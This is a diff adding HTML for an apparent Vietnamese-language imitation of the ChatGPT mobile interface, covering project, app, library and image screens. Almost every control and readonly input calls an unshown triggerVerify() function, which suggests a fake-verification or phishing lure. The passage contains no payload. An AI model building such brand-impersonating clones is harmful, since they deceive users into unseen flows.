+                    <div class="attach-item" onclick="triggerVerify(); document.getElementById('attachMenu').classList.remove('open')">
+                        <div class="icon-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+                        <span class="item-text">Ảnh</span>
+                    </div>
+                    <div class="attach-item" onclick="triggerVerify(); document.getElementById('attachMenu').classList.remove('open')">
+                        <div class="icon-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg></div>
+                        <span class="item-text">Tệp</span>
+                    </div>
+                    <div class="attach-item" onclick="triggerVerify(); document.getElementById('attachMenu').classList.remove('open')">
+                        <div class="icon-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></div>
+                        <span class="item-text">Plugin</span>
+                    </div>
+                </div>
+            </button>
+            <input type="text" id="chatInput" placeholder="Trả lời ChatGPT" onclick="triggerVerify()" readonly />
+            <button class="mic-btn" onclick="triggerVerify()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg>
+            </button>
+            <button class="send-btn-container" onclick="triggerVerify()">
+                <div class="send-icon icon-voice">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="7" x2="8" y2="17"/><line x1="12" y1="5" x2="12" y2="19"/><line x1="16" y1="8" x2="16" y2="16"/></svg>
+                </div>
+                <div class="send-icon icon-arrow">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+                </div>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ================= LAYOUT DỰ ÁN ================= -->
+<div id="projectLayout">
+    <div class="project-header">
+        <div class="project-header-left">
+            <button class="project-back-btn" onclick="closeProjectLayout()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            </button>
+            <span class="project-title">Dự án</span>
+        </div>
+        <button class="project-add-btn" onclick="triggerVerify()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+    </div>
+    <div class="project-search-area">
+        <div class="project-search-wrapper">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+            <input type="text" placeholder="Tìm kiếm dự án" onclick="triggerVerify()" readonly />
+        </div>
+    </div>
+    <div class="project-tabs">
+        <button class="project-tab" onclick="triggerVerify()">Tất cả</button>
+        <button class="project-tab active" onclick="triggerVerify()">Do bạn tạo</button>
+        <button class="project-tab" onclick="triggerVerify()">Được chia sẻ với bạn</button>
+    </div>
+    <div class="project-empty">
+        <div class="project-empty-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+        </div>
+        <h3>Chưa có dự án nào</h3>
+        <p>Tạo một dự án để sắp xếp các đoạn chat theo chủ đề hoặc nguồn.</p>
+        <button class="project-empty-btn" onclick="triggerVerify()">Dự án mới</button>
+    </div>
+</div>
+
+<!-- ================= LAYOUT ỨNG DỤNG ================= -->
+<div id="appLayout">
+    <div class="app-header">
+        <div class="app-header-left">
+            <button class="app-back-btn" onclick="closeAppLayout()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            </button>
+            <span class="app-title">Ứng dụng</span>
+        </div>
+        <button class="app-gpt-btn" onclick="triggerVerify()">GPT</button>
+    </div>
+    <div class="app-search-area">
+        <div class="app-search-wrapper">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+            <input type="text" placeholder="Tìm kiếm ứng dụng" onclick="triggerVerify()" readonly />
+        </div>
+    </div>
+    <div class="app-banner" onclick="triggerVerify()">
+        <div class="app-banner-top">
+            <div class="app-banner-info">
+                <div class="app-banner-logo">C</div>
+                <div>
+                    <div class="app-banner-title">Canva</div>
+                    <div class="app-banner-desc">Thiết kế và đồ họa</div>
+                </div>
+            </div>
+            <button class="app-banner-view-btn" onclick="event.stopPropagation(); triggerVerify()">Xem</button>
+        </div>
+        <div class="app-banner-prompt">@Canva create social posts</div>
+        <div class="app-banner-images">
+            <div class="app-banner-img" style="background: #fbece8; color: #a34a36; padding: 4px; text-align: center; font-size: 10px;"><div>FLIPPIN'<br>DELICIOUS<br>BURGERS</div></div>
+            <div class="app-banner-img" style="background: #f5f0e8; color: #4a2c1a; padding: 4px; text-align: center; font-size: 10px;"><div>THE BIG<br>CHOPPED</div></div>
+        </div>
+    </div>
+    <div class="app-subtitle">Trò chuyện với các ứng dụng yêu thích của bạn trong ChatGPT</div>
+    <div class="app-tabs">
+        <button class="app-tab active" onclick="triggerVerify()">Nổi bật</button>
+        <button class="app-tab" onclick="triggerVerify()">Lifestyle</button>
+        <button class="app-tab" onclick="triggerVerify()">Productivity</button>
+    </div>
+    <div class="app-list">
+        <div class="app-item" onclick="triggerVerify()"><div class="app-item-icon" style="background: #dbeafe; color: #2563eb;">G</div><div class="app-item-info"><div class="app-item-name">BigQuery</div><div class="app-item-desc">Query and manage BigQuery dat...</div></div><svg class="app-item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></div>
+        <div class="app-item" onclick="triggerVerify()"><div class="app-item-icon" style="background: #000000; color: #ffffff;">G</div><div class="app-item-info"><div class="app-item-name">GitHub</div><div class="app-item-desc">Truy cập kho lưu trữ, sự cố và đề...</div></div><svg class="app-item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></div>
+        <div class="app-item" onclick="triggerVerify()"><div class="app-item-icon" style="background: #000000; color: #ffffff;"><svg viewBox="0 0 24 24" fill="currentColor" style="width: 24px; height: 24px;"><path d="M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm0 4v2h14V7H5zm0 4v2h14v-2H5zm0 4v2h14v-2H5z"/></svg></div><div class="app-item-info"><div class="app-item-name">Intercom</div><div class="app-item-desc">Tra cứu các cuộc trò chuyện và p...</div></div><svg class="app-item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></div>
+        <div class="app-item" onclick="triggerVerify()"><div class="app-item-icon" style="background: #e7f3ff; color: #0078d4;">O</div><div class="app-item-info"><div class="app-item-name">Outlook Calendar</div><div class="app-item-desc">Tra cứu sự kiện và lịch trống</div></div><svg class="app-item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></div>
+        <div class="app-item" onclick="triggerVerify()"><div class="app-item-icon" style="background: #e7f3ff; color: #0078d4;">O</div><div class="app-item-info"><div class="app-item-name">Outlook Email</div><div class="app-item-desc">Tìm kiếm và tham chiếu email O...</div></div><svg class="app-item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></div>
+        <div class="app-item" onclick="triggerVerify()"><div class="app-item-icon" style="background: #e7f3ff; color: #0078d4;">S</div><div class="app-item-info"><div class="app-item-name">SharePoint</div><div class="app-item-desc">Tìm kiếm và lấy dữ liệu từ các tra...</div></div><svg class="app-item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></div>
+        <div class="app-item" onclick="triggerVerify()"><div class="app-item-icon" style="background: #4b53bc; color: #ffffff;">T</div><div class="app-item-info"><div class="app-item-name">Teams</div><div class="app-item-desc">Tra cứu các đoạn chat và tin nhắn</div></div><svg class="app-item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></div>
+    </div>
+</div>
+
+<!-- ================= LAYOUT THƯ VIỆN ================= -->
+<div id="libraryLayout">
+    <div class="lib-header">
+        <div class="lib-header-left">
+            <button class="lib-back-btn" onclick="closeLibraryLayout()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            </button>
+            <span class="lib-title">Thư viện</span>
+        </div>
+        <button class="lib-more-btn" onclick="triggerVerify()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="19" r="2"/></svg>
+        </button>
+    </div>
+    <div class="lib-tabs">
+        <button class="lib-tab active" onclick="triggerVerify()">Tất cả</button>
+        <button class="lib-tab" onclick="triggerVerify()">Ảnh</button>
+        <button class="lib-tab" onclick="triggerVerify()">Tệp</button>
+    </div>
+    <div class="lib-grid">
+        <div class="lib-card" onclick="triggerVerify()">
+            <div class="lib-card-banner"></div>
+            <div class="lib-card-avatar"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/></svg></div>
+            <div class="lib-card-content">
+                <div class="lib-card-name">cout &lt;&lt; "gringo_modz";</div>
+                <div class="lib-card-status"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="8"/></svg> Trực tuyến</div>
+                <div class="lib-card-actions">
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg><span>Nhắn tin</span></button>
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg><span>Tắt âm</span></button>
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.362 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.574 2.81.7A2 2 0 0 1 22 16.92z"/></svg><span>Gọi</span></button>
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8"/><polyline points="16 2 22 8 16 8"/><line x1="10" y1="14" x2="21" y2="14"/><line x1="10" y1="18" x2="18" y2="18"/><line x1="3" y1="10" x2="8" y2="10"/></svg><span>Quà</span></button>
+                </div>
+                <div class="lib-card-details">
+                    <div class="lib-card-bio">No bio yet</div>
+                    <div class="lib-card-desc">Giới thiệu</div>
+                    <div class="lib-card-user">@gringo_modz</div>
+                    <div class="lib-card-desc">Tên người dùng</div>
+                </div>
+                <div class="lib-card-images">
+                    <div class="lib-card-image" style="background: #121212; color: #e0e0e0; font-family: monospace; font-size: 10px; padding: 8px; align-items: flex-start; justify-content: flex-start; text-align: left; line-height: 1.4;">$ python<br>Python 3.10.12<br>&gt;&gt;&gt; import requests<br>Traceback (most recent call last):<br>  File "&lt;stdin&gt;", line 1, in &lt;module&gt;<br>ModuleNotFoundError: No module named 'requests'</div>
+                    <div class="lib-card-image" style="background: #121212; color: #e0e0e0; font-family: monospace; font-size: 10px; padding: 8px; align-items: flex-start; justify-content: flex-start; text-align: left; line-height: 1.4;">$ pip install requests<br>Collecting requests<br>  Downloading requests-2.31.0-py3-none-any.whl (62 kB)<br>Installing collected packages: requests<br>Successfully installed requests-2.31.0</div>
+                </div>
+            </div>
+        </div>
+        <div class="lib-card" onclick="triggerVerify()">
+            <div class="lib-card-banner"></div>
+            <div class="lib-card-avatar"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/></svg></div>
+            <div class="lib-card-content">
+                <div class="lib-card-name">cout &lt;&lt; "gringo_modz";</div>
+                <div class="lib-card-status"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="8"/></svg> Trực tuyến</div>
+                <div class="lib-card-actions">
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg><span>Nhắn tin</span></button>
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg><span>Tắt âm</span></button>
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.362 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.574 2.81.7A2 2 0 0 1 22 16.92z"/></svg><span>Gọi</span></button>
+                    <button class="lib-card-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8"/><polyline points="16 2 22 8 16 8"/><line x1="10" y1="14" x2="21" y2="14"/><line x1="10" y1="18" x2="18" y2="18"/><line x1="3" y1="10" x2="8" y2="10"/></svg><span>Quà</span></button>
+                </div>
+                <div class="lib-card-details">
+                    <div class="lib-card-bio">No bio yet</div>
+                    <div class="lib-card-desc">Giới thiệu</div>
+                    <div class="lib-card-user">@gringo_modz</div>
+                    <div class="lib-card-desc">Tên người dùng</div>
+                </div>
+                <div class="lib-card-images">
+                    <div class="lib-card-image" style="background: #000; color: #fff; font-family: monospace; font-size: 10px; padding: 8px; align-items: center; justify-content: center; text-align: center; line-height: 1.4;"><div style="font-size: 24px; font-weight: bold; margin-bottom: 4px;">bind</div><div style="border: 2px solid #fff; border-radius: 4px; padding: 4px 6px; width: fit-content; margin: 0 auto;">📂</div></div>
+                    <div class="lib-card-image" style="background: #121212; color: #e0e0e0; font-family: monospace; font-size: 9px; padding: 6px; align-items: flex-start; justify-content: flex-start; text-align: left; line-height: 1.3;">x Encountered error while generating package metadata.<br>× Problem with package 'maturin'<br>╰─&gt; This is an issue with the package mentioned above, not pip.<br>...<br>Failed to build 'cryptography'</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ================= LAYOUT THÊM (MORE) ================= -->
+<div id="moreLayout">
+    <div class="more-header">
+        <div class="more-header-left">
+            <button class="more-back-btn" onclick="closeMoreLayout()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            </button>
+            <span class="more-title">Thêm</span>
+        </div>
+    </div>
+    <div class="more-list">
+        <div class="more-item" onclick="openImageLayout()">
+            <div class="more-item-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+            <span class="more-item-text">Ảnh</span>
+        </div>
+        <div class="more-item" onclick="triggerVerify()">
+            <div class="more-item-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg></div>
+            <span class="more-item-text">Tệp</span>
+        </div>
+        <div class="more-item" onclick="triggerVerify()">
+            <div class="more-item-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12h4l2-3 3 3 4-3 2 3h4"/></svg></div>
+            <span class="more-item-text">Plugin</span>
+        </div>
+    </div>
+</div>
+
+<!-- ================= LAYOUT ẢNH (IMAGE) ================= -->
+<div id="imageLayout">
+    <div class="img-header">
+        <div class="img-header-left">
+            <button class="img-back-btn" onclick="closeImageLayout()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            </button>
+            <span class="img-title">Ảnh</span>
+        </div>
+    </div>
+
+    <div class="img-content">
+        <div class="img-section-title">Tạo hình ảnh</div>
+        <div class="img-scroll-row">
+            <div class="img-prompt-card" onclick="triggerVerify()">
+                <div class="img-prompt-img" style="background: #e0f2fe;"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='160'%3E%3Crect width='120' height='160' fill='%23e0f2fe'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%230285c3' text-anchor='middle' dominant-baseline='middle'%3EMessi%3C/text%3E%3C/svg%3E" alt="Messi"></div>
+                <div class="img-prompt-label">Chế độ Messi</div>
+            </div>
+            <div class="img-prompt-card" onclick="triggerVerify()">
+                <div class="img-prompt-img" style="background: #0f172a;"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='160'%3E%3Crect width='120' height='160' fill='%230f172a'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23cbd5e1' text-anchor='middle' dominant-baseline='middle'%3EDisco%3C/text%3E%3C/svg%3E" alt="Disco"></div>
+                <div class="img-prompt-label">Phong cách disco</div>
+            </div>
+            <div class="img-prompt-card" onclick="triggerVerify()">
+                <div class="img-prompt-img" style="background: #f3f4f6;"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='160'%3E%3Crect width='120' height='160' fill='%23f3f4f6'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23374151' text-anchor='middle' dominant-baseline='middle'%3EAnime%3C/text%3E%3C/svg%3E" alt="Anime"></div>
+                <div class="img-prompt-label">Truyện tranh anime</div>
+            </div>
+            <div class="img-prompt-card" onclick="triggerVerify()">
+                <div class="img-prompt-img" style="background: #1e293b;"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='160'%3E%3Crect width='120' height='160' fill='%231e293b'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%2394a3b8' text-anchor='middle' dominant-baseline='middle'%3EMusic%3C/text%3E%3C/svg%3E" alt="Music"></div>
+                <div class="img-prompt-label">M</div>
+            </div>
+        </div>
+
+        <div class="img-section-title">Hình ảnh của tôi</div>
+        <div class="img-grid">
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23222'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%201%3C/text%3E%3C/svg%3E" alt="1"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23333'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%202%3C/text%3E%3C/svg%3E" alt="2"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23444'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%203%3C/text%3E%3C/svg%3E" alt="3"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23555'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%204%3C/text%3E%3C/svg%3E" alt="4"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23666'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%205%3C/text%3E%3C/svg%3E" alt="5"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23777'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%206%3C/text%3E%3C/svg%3E" alt="6"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23888'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%207%3C/text%3E%3C/svg%3E" alt="7"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23999'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23fff' text-anchor='middle' dominant-baseline='middle'%3ECard%208%3C/text%3E%3C/svg%3E" alt="8"></div>
+            <div class="img-grid-item" onclick="triggerVerify()"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Crect width='200' height='200' fill='%23aaa'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='12' fill='%23000' text-anchor='middle' dominant-baseline='middle'%3ECard%209%3C/text%3E%3C/svg%3E" alt="9"></div>
+        </div>
+    </div>
+
+    <div class="img-input-area">
+        <div class="img-input-wrapper">
+            <button class="img-input-icon" onclick="triggerVerify()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+            </button>
+            <input type="text" placeholder="Mô tả hình ảnh" onclick="triggerVerify()" readonly />
+            <button class="img-input-icon" onclick="triggerVerify()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg>
+            </button>
+        </div>
+        <button class="img-send-btn" onclick="triggerVerify()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
+        </button>
+    </div>
+</div>
+
+<!-- ================= MENU & OVERLAYS ================= -->
+<div id="contextMenu">
+    <div class="ctx-header">Chào hỏi</div>
+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg></span> Chia sẻ</div>
+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><path d="M8 10h.01"/><path d="M12 10h.01"/><path d="M16 10h.01"/></svg></span> Ghim</div>
+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></span> Thêm người</div>
+    <div class="ctx-divider"></div>
